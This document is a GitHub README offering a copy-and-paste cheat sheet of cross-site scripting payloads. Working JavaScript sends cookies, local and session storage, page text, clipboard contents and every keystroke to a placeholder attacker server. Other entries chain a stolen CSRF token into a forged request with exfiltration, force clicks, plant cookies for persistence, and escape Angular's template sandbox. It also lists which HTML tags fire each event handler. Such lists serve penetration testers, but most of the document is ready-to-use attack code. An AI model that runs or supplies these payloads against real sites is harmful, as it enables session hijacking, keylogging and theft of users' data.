# Practical XSS Payloads
## ☕ ABOUT
Originally this started as just a little list of PoC payloads but it has now expanded to some more general notes as well. This now contains easy copy & paste PoC payloads as well as quick references for what HTML tags frequent event attributes use. 

### **Quick-navigation:**
+ **EXFILTRATION:**  
  + [FETCH](#fetch)  
  + [.$GET](https://github.com/Insecurities/PracticalXSSPayloads#jquery-ajax)
+ **FORCING ACTIONS:**
  + [CLICK](https://github.com/Insecurities/PracticalXSSPayloads#forcing-actions)
+ **SETTING ITEMS:**
  + [DOCUMENT.COOKIE](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#via-documentcookie)
  + [WINDOW.LOCALSTORAGE](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#via-windowlocalstorage)
+ **EVENT ATTRIBUTES:**
  + [ONLOAD](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onload)
  + [ONERROR](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onerror)
  + [ONMOUSEOVER](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onmouseover)
  + [ONSELECT](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onselect)
  + [ONKEY/UP/DOWN/PRESS](https://github.com/Insecurities/PracticalXSSPayloads/edit/main/README.md#onkeyupdownpress)
+ **ANGULAR NOTE**
  + [PAYLOADS FOR ANGULAR](https://github.com/Insecurities/PracticalXSSPayloads#angular)

# 👁️‍🗨️ EXFILTRATION
*For session hijacking, sensitive info exfil, etc.*
## FETCH
### GET VALUE FROM LOCAL STORAGE AND $FETCH:
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET VALUE FROM SESSION STORAGE AND $FETCH:
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET COOKIES AND $FETCH
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+document.cookie)
```
### GET COOKIES, POST $FETCH AND EXFIL RESPONSE (Good for exfiltrating data from response pages or where you might not be able to compromise cookies but leverage a CSRF token thats accessible)
```javascript
var data ={"YOUR_JSON":"SOMEVALUE"};var value=('; '+document.cookie).split(`; CSRF-TOKEN=`).pop().split(';')[0];fetch('/SENSITIVE_API_ENDPOINT',{method:'POST',headers: {'X-CSRF-Token':value,'Content-Type':'application/json;charset=utf-8',},body:JSON.stringify(data),}).then(response=>response.json()).then(data =>{fetch("https://{ATTACKER_SERVER}/key?"+JSON.stringify(data));});
```
### GET TEXT FROM PAGE AND $FETCH *(might be constrained by data length - use .slice() to shorten)*
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
```
### GET CONTENT FROM CLIPBOARD AND $FETCH *(Will prompt user for Clipboard perms if not already set)*
```javascript
setTimeout(async()=>fetch("https://$ATTACKER_SERVER/?copy="+(await window.navigator.clipboard.readText())), 1000)
```
### KEYLOGGER WITH $FETCH *(Script modified from Chentetrans logger)*
```javascript
var l = ""; document.onkeypress = function(e){;l+=e.key;fetch("https://$ATTACKER_SERVER/?q="+ l);}
```
## JQuery AJAX
### GET VALUE FROM LOCAL STORAGE AND $.GET
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET VALUE FROM SESSION STORAGE AND $.GET:
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET COOKIES AND $.GET
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
```  
### GET TEXT FROM PAGE AND $.GET *(might be constrained by data length - use .slice() to shorten)*
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
```

# 💥 FORCING ACTIONS
*For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
### CLICK ELEMENT BY ID
```javascript
document.getElementById("$TARGET_ELEMENT_ID").click()
```

# 🏠 SETTING ITEMS
*Sometimes you may want to set items in the browsers storage for vulnerability chains or persistence.*

**NOTE:**
For persistence or certain vulnerability chains you'll want to make sure you set an appropriate path (i.e `/`). For the purpose of these examples I've included the root path.
### VIA document.cookie
```javascript
document.cookie="cookieName=cookieValue>;Path=/"
```
### VIA window.localStorage
```javascript
window.localStorage.setItem('itemName', 'itemValue');
```

# 📔 EVENT ATTRIBUTES
*Something super crucial about event attributes is that **not every HTML tag is going to support the same event attributes**. So when you have injection into a div and you're trying to use `onload()` it's not going to work.*

#### `ONLOAD`
```html
<body>
<frame>
<frameset>
<iframe>
<img>
<link>
<script>
<style>
<svg>
```
#### `ONERROR`
```html
<img>
<object>
<link>
<script>
```
#### `ONMOUSEOVER`
```HTML
ALL ELEMENTS EXCEPT:
<base>, <bdo>, <br>, <head>, <html>, <iframe>, <meta>, <param>, <script>, <style>, and <title>
```
#### `ONSELECT`
```html
<input>
<textarea>
```
#### `ONKEY/UP/DOWN/PRESS`
```html
ALL ELEMENTS EXCEPT:
<base>, <bdo>, <br>, <head>, <html>, <iframe>, <meta>, <param>, <script>, <style>, and <title>
```

# ANGULAR
For Angular template injection you should be able to use the above payloads in conjunction with constructors. You can find an example below.
### GET VALUE FROM SESSION STORAGE AND FETCH
```javascript
{{constructor.constructor('fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))')()}}
```
